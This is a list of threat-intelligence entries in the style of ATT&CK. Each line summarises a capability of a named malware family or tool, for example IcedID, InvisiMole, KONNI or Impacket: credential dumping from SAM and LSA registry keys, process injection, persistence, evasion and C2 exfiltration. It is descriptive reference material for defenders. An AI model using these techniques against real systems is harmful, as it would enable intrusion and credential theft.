Hildegard has searched for SSH keys, Docker credentials, and Kubernetes service tokens.
Hildegard has decrypted ELF files with AES.
Hildegard has modified DNS resolvers to evade DNS monitoring tools.
Hildegard has modified /etc/ld.so.preload to intercept shared library import functions.
Hildegard has encrypted an ELF file.
Hildegard has used the BOtB tool that can break out of containers.
Hildegard has used the BOtB tool which exploits CVE-2019-5736.
Hildegard was executed through an unsecure kubelet that allowed anonymous access to the victim environment.
Hildegard has deleted scripts after execution.
Hildegard has downloaded additional scripts that build and run Monero cryptocurrency miners.
Hildegard has created a user named “monerodaemon”.
Hildegard has disguised itself as a known Linux process.
Hildegard has used masscan to look for kubelets in the internal Kubernetes network.
Hildegard has searched for private keys in .ssh.
Hildegard has established tmate sessions for C2 communications.
Hildegard has used xmrig to mine cryptocurrency.
Hildegard has modified /etc/ld.so.preload to overwrite readdir() and readdir64().
Hildegard has packed ELF files into other binaries.
Hildegard has collected the host's OS, CPU, and memory information.
Hildegard has started a monero service.
Hildegard has used shell scripts for execution.
Hildegard has downloaded scripts from GitHub.
HotCroissant has the ability to list the names of all open windows on the infected host.
HotCroissant has encrypted strings with single-byte XOR and base64 encoded RC4.
HotCroissant has the ability to download files from the infected host to the command and control (C2) server.
HotCroissant has the ability to clean up installed files, delete files, and delete itself from the victim’s machine.
HotCroissant has the ability to retrieve a list of files in a given directory as well as drives and drive types.
HotCroissant has the ability to hide the window for operations performed on a given file.
HotCroissant has the ability to upload a file from the command and control (C2) server to the victim machine.
HotCroissant can perform dynamic DLL importing and API lookups using &lt;code&gt;LoadLibrary&lt;/code&gt; and &lt;code&gt;GetProcAddress&lt;/code&gt; on obfuscated strings.
HotCroissant has the ability to list running processes on the infected host.
HotCroissant has attempted to install a scheduled task named “Java Maintenance64” on startup to establish persistence.
HotCroissant has the ability to do real time screen viewing on an infected host.
HotCroissant has the ability to stop services on the infected host.
HotCroissant can retrieve a list of applications from the &lt;code&gt;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths&lt;/code&gt; registry key.
HotCroissant has used the open source UPX executable packer.
HotCroissant has compressed network communications and encrypted them with a custom stream cipher.
HotCroissant has the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.
HotCroissant has the ability to identify the IP address of the compromised machine.
HotCroissant has the ability to collect the username on the infected host.
HotCroissant has the ability to retrieve a list of services on the infected host.
HotCroissant can remotely open applications on the infected host with the &lt;code&gt;ShellExecuteA&lt;/code&gt; command.
Hydraq creates a backdoor through which remote attackers can adjust token privileges.
Hydraq creates a backdoor through which remote attackers can clear all system event logs.
Hydraq creates a backdoor through which remote attackers can read data from files.
Hydraq connects to a predefined domain on port 443 to exfil gathered information.
Hydraq creates a backdoor through which remote attackers can delete files.
Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.
Hydraq creates a backdoor through which remote attackers can download files and additional malware components.
Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys.
Hydraq uses basic obfuscation in the form of spaghetti code.
Hydraq creates a backdoor through which remote attackers can monitor processes.
Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.
Hydraq includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.
Hydraq uses svchost.exe to execute a malicious DLL included in a new service group.
Hydraq creates a backdoor through which remote attackers can load and call DLL functions.
Hydraq C2 traffic is encrypted using bitwise NOT and XOR operations.
Hydraq creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.
Hydraq creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.
Hydraq creates a backdoor through which remote attackers can monitor services.
Hydraq creates new services to establish persistence.
HyperBro has used a legitimate application to sideload a DLL to decrypt, decompress, and run a payload.
HyperBro can unpack and decrypt its payload prior to execution.
HyperBro can be delivered encrypted to a compromised host.
HyperBro has the ability to delete a specified file.
HyperBro has the ability to download additional files.
HyperBro has the ability to run an application (&lt;code&gt;CreateProcessW&lt;/code&gt;) or script/file (&lt;code&gt;ShellExecuteW&lt;/code&gt;) via API.
HyperBro can run shellcode it injects into a newly created process.
HyperBro has the ability to take screenshots.
HyperBro has the ability to start and stop a specified service.
HyperBro has the ability to pack its payload.
HyperBro can list all services and their configurations.
HyperBro has used HTTPS for C2 communications.
HyperStack can use default credentials to connect to IPC$ shares on remote machines.
HyperStack can connect to the IPC$ share on remote machines.
HyperStack can enumerate all account names on a remote share.
HyperStack can add the name of its communication pipe to &lt;code&gt;HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes&lt;/code&gt;.
HyperStack can use Windows API's &lt;code&gt;ConnectNamedPipe&lt;/code&gt; and &lt;code&gt;WNetAddConnection2&lt;/code&gt; to detect incoming connections and connect to remote shares.
HyperStack has used RSA encryption for C2 communications.
ISMInjector uses the &lt;code&gt;certutil&lt;/code&gt; command to decode a payload file.
ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.
ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.
ISMInjector creates scheduled tasks to establish persistence.
IceApple can encrypt and compress files using Gzip prior to exfiltration.
IceApple can use Base64 and "junk" JavaScript code to obfuscate information.
IceApple can harvest credentials from local and remote host registries.
IceApple can collect files, passwords, and other data from a compromised host.
IceApple can use a Base64-encoded AES key to decrypt tasking.
The IceApple Active Directory Querier module  can perform authenticated requests against an Active Directory server.
IceApple's Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2.
IceApple can delete files and directories from targeted systems.
The IceApple Directory Lister module can list information about files and directories including creation time, last write time, name, and size.
IceApple is an IIS post-exploitation framework, consisting of 18 modules that provide several functionalities.
IceApple's Credential Dumper module can dump LSA secrets from registry keys, including: `HKLM\SECURITY\Policy\PolEKList\default`, `HKLM\SECURITY\Policy\Secrets\*\CurrVal`, and `HKLM\SECURITY\Policy\Secrets\*\OldVal`.
IceApple .NET assemblies have used `App_Web_` in their file names to appear legitimate.
IceApple can use reflective code loading to load .NET assemblies into `MSExchangeOWAAppPool` on targeted Exchange servers.
IceApple's Credential Dumper module can dump encrypted password hashes from SAM registry keys, including `HKLM\SAM\SAM\Domains\Account\F` and `HKLM\SAM\SAM\Domains\Account\Users\*\V`.
The IceApple Result Retriever module can AES encrypt C2 responses.
The IceApple Server Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary.
The IceApple ifconfig module can iterate over all network interfaces on the host and retrieve the name, description, MAC address, DNS suffix, DNS servers, gateways, IPv4 addresses, and subnet masks.
The IceApple OWA credential logger can monitor for OWA authentication requests and log the credentials.
IceApple can use HTTP GET to request and pull information from C2.
IcedID has used SSL and TLS in communications with C2.
IcedID has used &lt;code&gt;ZwQueueApcThread&lt;/code&gt; to inject itself into remote processes.
IcedID has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  IcedID can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.
IcedID can query LDAP to identify additional users on the network to infect.
IcedID has utilzed encrypted binaries and base64 encoded strings.
IcedID has the ability to download additional modules and a configuration file from C2.
IcedID has been executed through Word documents with malicious embedded macros.
IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application.
IcedID has called &lt;code&gt;ZwWriteVirtualMemory&lt;/code&gt;, &lt;code&gt;ZwProtectVirtualMemory&lt;/code&gt;, &lt;code&gt;ZwQueueApcThread&lt;/code&gt;, and &lt;code&gt;NtResumeThread&lt;/code&gt; to inject itself into a remote process.
IcedID has the ability to identify Workgroup membership.
IcedID has established persistence by creating a Registry run key.
IcedID has created a scheduled task that executes every hour to establish persistence.
IcedID has packed and encrypted its loader module.
IcedID has been delivered via phishing e-mails with malicious attachments.
IcedID has embedded binaries within RC4 encrypted .png files.
IcedID has the ability to identify the computer name and OS version on a compromised host.
IcedID has used obfuscated VBA string expressions.
IcedID has used HTTPS in communications with C2.
IcedID has used WMI to execute binaries.
Imminent Monitor has a remote microphone monitoring capability.
Imminent Monitor has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.
Imminent Monitor has a PasswordRecoveryPacket module for recovering browser passwords.
Imminent Monitor has decoded malware components that are then dropped to the system.
Imminent Monitor has a feature to disable Windows Task Manager.
Imminent Monitor has uploaded a file containing debugger logs, network information and system information to the C2.
Imminent Monitor has deleted files related to its dynamic debugger feature.
Imminent Monitor has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.
Imminent Monitor has a dynamic debugging feature to set the file attribute to hidden.
Imminent Monitor has a keylogging module.
Imminent Monitor has leveraged CreateProcessW() call to execute the debugger.
Imminent Monitor has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.
Imminent Monitor has a "Process Watcher" feature to monitor processes in case the client ever crashes or gets closed.
Imminent Monitor has a module for performing remote desktop access.
Imminent Monitor has the capability to run a cryptocurrency miner on the victim machine.
Imminent Monitor has a remote webcam monitoring capability.
Impacket modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.
Impacket modules like ntlmrelayx and smbrelayx can be used in conjunction with Network Sniffing and LLMNR/NBT-NS Poisoning and SMB Relay to gather NetNTLM credentials for Brute Force or relay attacks that can gain code execution.
SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information.
SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information.
SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information from NTDS.dit.
Impacket can be used to sniff network traffic via an interface or raw socket.
SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information.
Impacket contains various modules emulating other service execution tools such as PsExec.
Impacket's wmiexec module can be used to execute commands through WMI.
Industroyer uses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices.
Industroyer has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.
Industroyer’s data wiper module clears registry keys and overwrites both ICS configuration and Windows files.
Industroyer decrypts code to connect to a remote C2 server.
Industroyer sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.
Industroyer’s data wiper component enumerates specific files on all the Windows drives.
Industroyer downloads a shellcode payload from a remote C2 server and loads it into memory.
Industroyer used Tor nodes for C2.
Industroyer uses a custom port scanner to map out a network.
Industroyer uses heavily obfuscated code in its Windows Notepad backdoor.
Industroyer attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.
Industroyer has a data wiper component that enumerates keys in the Registry &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services&lt;/code&gt;.
Industroyer can enumerate remote computers in the compromised network.
Industroyer’s data wiper module writes zeros into the registry keys in &lt;code&gt;SYSTEM\CurrentControlSet\Services&lt;/code&gt; to render a system inoperable.
Industroyer collects the victim machine’s Windows GUID.
Industroyer’s 61850 payload component enumerates connected network adapters and their corresponding IP addresses.
Industroyer can use supplied user credentials to execute processes and stop services.
Industroyer’s main backdoor connected to a remote C2 server using HTTPS.
Industroyer can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary.
Industroyer2 has the ability to cyclically enumerate running processes such as PServiceControl.exe, PService_PDD.exe, and other targets supplied through a hardcoded configuration.
InnaputRAT has a command to delete files.
InnaputRAT enumerates directories and obtains file attributes on a system.
InnaputRAT variants have attempted to appear legitimate by adding a new service named OfficeUpdateService.
InnaputRAT variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.
InnaputRAT uses the API call ShellExecuteW for execution.
InnaputRAT uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.
Some InnaputRAT variants establish persistence by modifying the Registry key &lt;code&gt;HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe&lt;/code&gt;.
InnaputRAT gathers volume drive information and system information.
InnaputRAT launches a shell to execute commands on the victim’s machine.
Some InnaputRAT variants create a new Windows service to establish persistence.
InvisiMole can enumerate windows and child windows on a compromised host.
InvisiMole uses a variation of the XOR cipher to encrypt files before exfiltration.
InvisiMole can use zlib to compress and decompress data.
InvisiMole uses WinRAR to compress data that is intended to be exfiltrated.
InvisiMole can inject its code into a trusted process via the APC queue.
InvisiMole can record sound using input audio devices.
InvisiMole can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.
InvisiMole can use fileless UAC bypass and create an elevated COM object to escalate privileges.
InvisiMole can use the &lt;code&gt;ITaskService&lt;/code&gt;, &lt;code&gt;ITaskDefinition&lt;/code&gt; and &lt;code&gt;ITaskSettings&lt;/code&gt; COM interfaces to schedule a task.
InvisiMole can register itself for execution and persistence via the Control Panel.
InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.
InvisiMole has used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies.
InvisiMole can collect data from the system, and can monitor changes in specified directories.
InvisiMole can collect jpeg files from connected MTP devices.
InvisiMole can decrypt, unpack and load a DLL from its resources, or from blobs encrypted with Data Protection API, two-key triple DES, and variations of the XOR cipher.
InvisiMole has a command to disable routing and the Firewall on the victim’s machine.
InvisiMole can use Data Protection API to encrypt its components on the victim’s computer, to evade detection, and to make sure the payload can only be decrypted and loaded on one specific compromised computer.
InvisiMole has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.
InvisiMole has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.
InvisiMole can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.
InvisiMole InvisiMole can identify proxy servers used by the victim and use them for C2 communication.
InvisiMole has been configured with several servers available for alternate C2 communications.
InvisiMole has deleted files and directories including XML and files successfully uploaded to C2 servers.
InvisiMole can list information about files in a directory and recently opened or used documents. InvisiMole can also search for specific files by supplied file mask.
InvisiMole can create hidden system directories.
InvisiMole has executed legitimate tools in hidden windows.
InvisiMole has undergone regular technical improvements in an attempt to evade detection.
InvisiMole can upload files to the victim's machine for operations.
InvisiMole can can remove all system restore points.
InvisiMole can function as a proxy to create a server that relays communication between the client and C&amp;C server, or between two clients.
InvisiMole can use a JavaScript file as part of its execution chain.
InvisiMole can capture keystrokes on a compromised host.
InvisiMole has used ListPlanting to inject code into a trusted process.
InvisiMole has a command to list account information on the victim’s machine.
InvisiMole determines a working directory where it stores all the gathered data about the compromised machine.
InvisiMole can deliver trojanized versions of software and documents, relying on user execution.
InvisiMole has attempted to disguise itself by registering under a seemingly legitimate service name.
InvisiMole has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.
InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.
InvisiMole can use winapiexec tool for indirect execution of  &lt;code&gt;ShellExecuteW&lt;/code&gt; and &lt;code&gt;CreateProcessA&lt;/code&gt;.
InvisiMole can scan the network for open ports and vulnerable instances of RDP and SMB protocols.
InvisiMole can disconnect previously connected remote drives.
InvisiMole can gather network share information.
InvisiMole has used TCP to download additional modules.
InvisiMole can use a modified base32 encoding to encode data within the subdomain of C2 requests.
InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.
InvisiMole can inject its backdoor as a portable executable into a target process.
InvisiMole can obtain a list of running processes.
InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.
InvisiMole can mimic HTTP protocol with custom HTTP “verbs” HIDE, ZVVP, and NOP.
InvisiMole can enumerate Registry values, keys, and data.
InvisiMole can place a lnk file in the Startup Folder to achieve persistence.
InvisiMole has used rundll32.exe for execution.
InvisiMole has used scheduled tasks named &lt;code&gt;MSST&lt;/code&gt; and &lt;code&gt;\Microsoft\Windows\Autochk\Scheduled&lt;/code&gt; to establish persistence.
InvisiMole can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.
InvisiMole can check for the presence of network sniffers, AV, and BitDefender firewall.
InvisiMole has used Windows services as a way to execute its malicious payload.
InvisiMole can use a .lnk shortcut for the Control Panel to establish persistence.
InvisiMole can collect information about installed software used by specific users, software executed on user login, and software executed by each system.
InvisiMole uses variations of a simple XOR encryption routine for C&amp;C communications.
InvisiMole can check for artifacts of VirtualBox, Virtual PC and VMware environment, and terminate itself if they are detected.
InvisiMole can gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.
InvisiMole gathers information on the IP forwarding table, MAC address, configured proxy, and network SSID.
InvisiMole lists local users and session information.
InvisiMole can obtain running services on the victim.
InvisiMole gathers the local system time from the victim’s machine.
InvisiMole can replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network.
InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values. InvisiMole also has a built-in command to modify file times.
InvisiMole can remotely activate the victim’s webcam to capture content.
InvisiMole uses HTTP for C2 communications.
InvisiMole can launch a remote shell to execute commands.
InvisiMole can register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.
Invoke-PSImage can be used to embed payload data within a new image file.
Invoke-PSImage can be used to embed a PowerShell script within the pixels of a PNG file.
IronNetInjector has the ability to decrypt embedded .NET and PE payloads.
IronNetInjector has the ability to inject a DLL into running processes, including the IronNetInjector DLL into explorer.exe.
IronNetInjector can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.
IronNetInjector has been disguised as a legitimate service using the name PythonUpdateSrvc.
IronNetInjector can identify processes via C# methods such as &lt;code&gt;GetProcessesByName&lt;/code&gt; and running Tasklist with the Python &lt;code&gt;os.popen&lt;/code&gt; function.
IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.
IronNetInjector can use IronPython scripts to load payloads with the help of a .NET injector.
IronNetInjector has used a task XML file named &lt;code&gt;mssch.xml&lt;/code&gt; to run an IronPython script when a user logs in or when specific system events are created.
Ixeshe can collect data from a local system.
Ixeshe has a command to delete a file from the machine.
Ixeshe can list file and directory information.
Ixeshe sets its own executable file's attributes to hidden.
Ixeshe can download and execute additional files.
Ixeshe has used registry values and file names associated with Adobe software, such as AcroRd32.exe.
Ixeshe can list running processes.
Ixeshe can achieve persistence by adding itself to the &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; Registry key.
Ixeshe uses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests.
Ixeshe collects the computer name of the victim's system during the initial infection.
Ixeshe enumerates the IP address, network proxy settings, and domain name from a victim's system.
Ixeshe collects the username from the victim’s machine.
Ixeshe can list running services.
Ixeshe uses HTTP for command and control.
Ixeshe is capable of executing commands via cmd.
JCry has encrypted files and demanded Bitcoin to decrypt those files.
JCry has been observed deleting shadow copies to ensure that data cannot be restored easily.
JCry has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer.
JCry has used PowerShell to execute payloads.
JCry has created payloads in the Startup directory to maintain persistence.
JCry has used VBS scripts.
JCry has used &lt;code&gt;cmd.exe&lt;/code&gt; to launch PowerShell.
A JHUHUGIT variant accesses a screenshot saved in the clipboard and converts it to a JPG image.
JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).
Many strings in JHUHUGIT are obfuscated with a XOR algorithm.
JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.
JHUHUGIT tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.
The JHUHUGIT dropper can delete itself from the victim. Another JHUHUGIT variant has the capability to delete specified files.
JHUHUGIT can retrieve an additional payload from its C2 server. JHUHUGIT has a command to download files to the victim’s machine.
JHUHUGIT has registered a Windows shell script under the Registry key &lt;code&gt;HKCU\Environment\UserInitMprLogonScript&lt;/code&gt; to establish persistence.
JHUHUGIT obtains a list of running processes on the victim.
JHUHUGIT performs code injection injecting its own functions to browser processes.
JHUHUGIT has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.
JHUHUGIT is executed using rundll32.exe.
JHUHUGIT has registered itself as a scheduled task to run each time the current user logs in.
A JHUHUGIT variant takes screenshots by simulating the user pressing the "Take Screenshot" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.
A JHUHUGIT variant encodes C2 POST data base64.
JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum&lt;/code&gt;. Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name.
A JHUHUGIT variant gathers network interface card information.
JHUHUGIT variants have communicated with C2 servers over HTTP and HTTPS.
JHUHUGIT uses a .bat file to execute a .dll.
JHUHUGIT has registered itself as a service to establish persistence.
A JPIN variant downloads the backdoor payload via the BITS service.
JPIN can lower security settings by changing Registry keys.
JPIN's installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.
JPIN can communicate over FTP.
JPIN can enumerate drives and their types. It can also change file permissions using cacls.exe.
JPIN can download files and upgrade itself.
JPIN contains a custom keylogger.
JPIN can obtain the permissions of the victim user.
JPIN can send email over SMTP.
A JPIN uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.
JPIN can list running processes.
JPIN can inject content into lsass.exe to load a module.
JPIN can enumerate Registry keys.
JPIN checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.
JPIN can obtain system information such as OS version and disk space.
JPIN can obtain network information, including DNS, IP, and proxies.
JPIN can obtain the victim user name.
JPIN can list running services.
JPIN can use the command-line utility cacls.exe to change file permissions.
JPIN can use the command-line utility cacls.exe to change file permissions.
JSS Loader has the ability to download malicious executables to a compromised host.
JSS Loader can download and execute JavaScript files.
JSS Loader has been executed through malicious attachments contained in spearphishing emails.
JSS Loader has the ability to download and execute PowerShell scripts.
JSS Loader has the ability to launch scheduled tasks to establish persistence.
JSS Loader has been delivered by phishing emails containing malicious Microsoft Excel attachments.
JSS Loader can download and execute VBScript files.
Janicab captured audio and sent it out to a C2 server.
Janicab used a valid AppleDeveloperID to sign the code to get past security restrictions.
Janicab used a cron job for persistence on Mac devices.
Janicab captured screenshots and sent them out to a C2 server.
Javali can use large obfuscated libraries to hinder detection and analysis.
Javali can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge.
Javali can use DLL side-loading to load malicious DLLs into legitimate executables.
Javali can read C2 information from Google Documents and YouTube.
Javali can download payloads from remote C2 servers.
Javali has achieved execution through victims opening malicious attachments, including MSI files with embedded VBScript.
Javali has achieved execution through victims clicking links to malicious websites.
Javali has used the MSI installer to download and execute malicious payloads.
Javali can monitor processes for open browsers and custom banking applications.
Javali has been delivered as malicious e-mail attachments.
Javali has been delivered via malicious links embedded in e-mails.
Javali has used embedded VBScript to download malicious payloads from C2.
KARAE can use public cloud-based storage providers for command and control.
KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.
KARAE can upload and download files, including second-stage malware.
KARAE can collect system information.
KEYMARBLE has the capability to delete files off the victim’s machine.
KEYMARBLE has a command to search for files on the victim’s machine.
KEYMARBLE can upload files to the victim’s machine and can download additional payloads.
KEYMARBLE has a command to create Registry entries for storing data under &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\Microsoft\WABE\DataPath&lt;/code&gt;.
KEYMARBLE can obtain a list of running processes on the system.
KEYMARBLE can capture screenshots of the victim’s machine.
KEYMARBLE uses a customized XOR algorithm to encrypt C2 communications.
KEYMARBLE has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.
KEYMARBLE gathers the MAC address of the victim’s machine.
KEYMARBLE can execute shell commands using cmd.exe.
KEYPLUG can use TLS-encrypted WebSocket Protocol (WSS) for C2.
The KEYPLUG Windows variant has retrieved C2 addresses from encoded data in posts on tech community forums.
KEYPLUG can decode its configuration file to determine C2 protocols.
KEYPLUG can use a hardcoded one-byte XOR encoded configuration file.
KEYPLUG can use TCP and KCP (KERN Communications Protocol) over UDP for C2 communication.
KEYPLUG has used Cloudflare CDN associated infrastructure to redirect C2 communications to malicious domains.
KEYPLUG can obtain the current tick count of an infected computer.
KEYPLUG has the ability to communicate over HTTP and WebSocket Protocol (WSS) for C2.
KGH_SPY can collect credentials from WINSCP.
KGH_SPY has the ability to steal data from the Chrome, Edge, Firefox, Thunderbird, and Opera browsers.
KGH_SPY can send a file containing victim system information to C2.
KGH_SPY can decrypt encrypted strings and write them to a newly created folder.
KGH_SPY has used encrypted strings in its installer.
KGH_SPY can exfiltrate collected information from the host to the C2 server.
KGH_SPY can enumerate files and directories on a compromised host.
KGH_SPY has the ability to download and execute code from remote servers.
KGH_SPY can perform keylogging by polling the &lt;code&gt;GetAsyncKeyState()&lt;/code&gt; function.
KGH_SPY can save collected system information to a file named "info" before exfiltration.
KGH_SPY can harvest data from mail clients.
KGH_SPY has the ability to set the &lt;code&gt;HKCU\Environment\UserInitMprLogonScript&lt;/code&gt; Registry key to execute logon scripts.
KGH_SPY has been spread through Word documents containing malicious macros.
KGH_SPY has masqueraded as a legitimate Windows tool.
KGH_SPY can execute PowerShell commands on the victim's machine.
KGH_SPY can collect information on installed applications.
KGH_SPY can collect drive information from a compromised host.
KGH_SPY can send data to C2 with HTTP POST requests.
KGH_SPY has the ability to set a Registry key to run a cmd.exe command.
KGH_SPY can collect credentials from the Windows Credential Manager.
KOCTOPUS will perform UAC bypass either through fodhelper.exe or eventvwr.exe.
KOCTOPUS can delete created registry keys used for persistence as part of its cleanup procedure.
KOCTOPUS has obfuscated scripts with the BatchEncryption tool.
KOCTOPUS has deobfuscated itself before executing its commands.
KOCTOPUS will attempt to delete or disable all Registry keys and scheduled tasks related to Microsoft Security Defender and Security Essentials.
KOCTOPUS has used &lt;code&gt;-WindowsStyle Hidden&lt;/code&gt; to hide the command window.
KOCTOPUS has executed a PowerShell command to download a file to the system.
KOCTOPUS has relied on victims clicking a malicious document for execution.
KOCTOPUS has relied on victims clicking on a malicious link delivered via email.
KOCTOPUS has been disguised as legitimate software programs associated with the travel and airline industries.
KOCTOPUS has added and deleted keys from the Registry.
KOCTOPUS can use the `LoadResource` and `CreateProcessW` APIs for execution.
KOCTOPUS has used PowerShell commands to download additional files.
KOCTOPUS has deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet.
KOCTOPUS can set the AutoRun Registry key with a PowerShell command.
KOCTOPUS has been distributed via spearphishing emails with malicious attachments.
KOCTOPUS has been distributed as a malicious link within an email.
KOCTOPUS has checked the OS version using `wmic.exe` and the `find` command.
KOCTOPUS has used VBScript to call wscript to execute a PowerShell command.
KOCTOPUS has used `cmd.exe` and batch files for execution.
KOMPROGO is capable of retrieving information about the infected system.
KOMPROGO is capable of creating a reverse shell.
KOMPROGO is capable of running WMI queries.
KONNI has encrypted data and files prior to exfiltration.
KONNI has bypassed UAC by performing token impersonation as well as an RPC-based method, this included bypassing UAC set to “AlwaysNotify".
KONNI had a feature to steal data from the clipboard.
KONNI has modified ComSysApp service to load the malicious DLL payload.
KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.
KONNI can steal profiles (containing credential information) from Firefox, Chrome, and Opera.
KONNI has stored collected information and discovered processes in a tmp file.
KONNI has used certutil to download and decode base64 encoded strings and has also devoted a custom section to performing all the components of the deobfuscation process.
KONNI is heavily obfuscated and includes encrypted configuration files.
KONNI has sent data and files to its C2 server.
KONNI has used FTP to exfiltrate reconnaissance data out.
KONNI can delete files.
A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.
KONNI can download files and execute them on the victim’s machine.
KONNI has executed malicious JavaScript code.
KONNI has the capability to perform keylogging.
KONNI has relied on a victim to enable malicious macros within an attachment delivered via email.
KONNI has pretended to be the xmlProv Network Provisioning service.
KONNI has created a shortcut called "Anti virus service.lnk" in an apparent attempt to masquerade as a legitimate file.
KONNI has modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence.
KONNI has hardcoded API calls within its functions to use on the victim's machine.
KONNI has used parent PID spoofing to spawn a new `cmd` process using `CreateProcessW` and a handle to `Taskmgr.exe`.
KONNI used PowerShell to download and execute a specific 64-bit version of the malware.
KONNI has used the command &lt;code&gt;cmd /c tasklist&lt;/code&gt; to get a snapshot of the current processes on the target machine.
A version of KONNI has dropped a Windows shortcut into the Startup folder to establish persistence.
KONNI has used Rundll32 to execute its loader for privilege escalation purposes.
KONNI can take screenshots of the victim’s machine.
A version of KONNI drops a Windows shortcut on the victim’s machine to establish persistence.
KONNI has been packed for obfuscation.
KONNI has been delivered via spearphishing campaigns through a malicious Word document.
KONNI has used a custom base64 key to encode stolen data before exfiltration.
KONNI has used AES to encrypt C2 traffic.
KONNI can gather the OS version, architecture information, connected drives, hostname, RAM size, and disk space information from the victim’s machine and has used &lt;code&gt;cmd /c systeminfo&lt;/code&gt; command to get a snapshot of the current system state of the target machine.
KONNI can collect the IP address from the victim’s machine.
KONNI has used &lt;code&gt;net session&lt;/code&gt; on the victim's machine.
KONNI can collect the username from the victim’s machine.
KONNI has used HTTP POST for C2.
KONNI has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain.
KONNI has registered itself as a service using its export function.
KOPILUWAK can gather information from compromised hosts.
KOPILUWAK has exfiltrated collected data to its C2 via POST requests.
